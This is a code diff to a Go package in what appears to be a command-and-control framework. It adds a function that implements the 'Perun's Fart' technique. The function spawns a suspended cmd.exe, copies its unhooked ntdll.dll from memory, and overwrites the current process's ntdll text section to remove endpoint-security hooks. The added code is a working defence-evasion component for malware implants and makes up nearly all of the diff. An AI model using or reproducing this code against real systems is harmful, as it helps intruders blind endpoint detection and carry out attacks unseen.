@@ -4,17 +4,82 @@
 package unhookntdll
 
 import (
+	"bytes"
 	"debug/pe"
 	"log"
 	"syscall"
 	"unsafe"
 
+	"github.com/latortuga71/GoC2/pkg/peloader"
 	"github.com/latortuga71/GoC2/pkg/rawapi"
 	"github.com/latortuga71/GoC2/pkg/winapi"
 	"golang.org/x/sys/windows"
 )
 
 var SEC_IMAGE uint32 = 0x1000000
+
+func PerunsFart() (string, error) {
+	cmdLine, err := windows.UTF16PtrFromString("cmd.exe")
+	if err != nil {
+		return "", err
+	}
+	si := windows.StartupInfo{}
+	pi := windows.ProcessInformation{}
+	err = windows.CreateProcess(nil, cmdLine, nil, nil, false, windows.CREATE_SUSPENDED|windows.CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
+	if err != nil {
+		return "", err
+	}
+	ntdllStr, err := windows.UTF16PtrFromString("ntdll.dll")
+	if err != nil {
+		return "", err
+	}
+	var ntddlHandle windows.Handle
+	err = windows.GetModuleHandleEx(0, ntdllStr, &ntddlHandle)
+	if err != nil {
+		return "", err
+	}
+	dosHeader := (*peloader.ImageDOSHeader)(unsafe.Pointer(ntddlHandle))
+	imageNtHeader := (*peloader.ImageNtHeader)(unsafe.Pointer(uintptr(ntddlHandle) + uintptr(dosHeader.AddressOfNewEXEHeader)))
+	optionalHeader := (*peloader.ImageOptionalHeader64)(unsafe.Pointer(&imageNtHeader.OptionalHeader))
+	ntdllSize := optionalHeader.SizeOfImage
+	base := make([]byte, ntdllSize)
+	var nBytesRead uint32
+	err = rawapi.NtReadVirtualMemory(uintptr(pi.Process), uintptr(ntddlHandle), (uintptr)(unsafe.Pointer(&base[0])), ntdllSize, &nBytesRead)
+	if err != nil {
+		return "", err
+	}
+	err = windows.TerminateProcess(pi.Process, 0)
+	if err != nil {
+		return "", err
+	}
+	buffer := bytes.NewBuffer(base)
+	fresh, err := pe.NewFile(bytes.NewReader(buffer.Bytes()))
+	if err != nil {
+		return "", err
+	}
+	textSection := fresh.Sections[0]
+	offsetToTextSectionHooked := unsafe.Pointer(ntddlHandle + windows.Handle(textSection.VirtualAddress))
+	var oldProtect uint32
+	var szPtr uintptr = uintptr(textSection.VirtualSize)
+	hCurrent, err := windows.GetCurrentProcess()
+	if err != nil {
+		log.Fatal(err)
+	}
+	err = rawapi.NtProtectVirtualMemory(uintptr(hCurrent), (uintptr)(offsetToTextSectionHooked), &szPtr, 0x40, &oldProtect)
+	if err != nil {
+		return "", err
+	}
+	var nBytesWritten *uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(hCurrent), uintptr(offsetToTextSectionHooked), (uintptr)(unsafe.Pointer(&base[textSection.VirtualAddress])), uintptr(textSection.VirtualSize), nBytesWritten)
+	if err != nil {
+		return "", err
+	}
+	err = rawapi.NtProtectVirtualMemory(uintptr(hCurrent), (uintptr)(offsetToTextSectionHooked), &szPtr, oldProtect, &oldProtect)
+	if err != nil {
+		return "", err
+	}
+	return "[+] Farted.", nil
+}
 
 func UnhookRaw(localNtdllAddress windows.Handle, cleanNtdllMapping uintptr) error {
 	pe, err := pe.Open(`C:\\Windows\System32\ntdll.dll`)
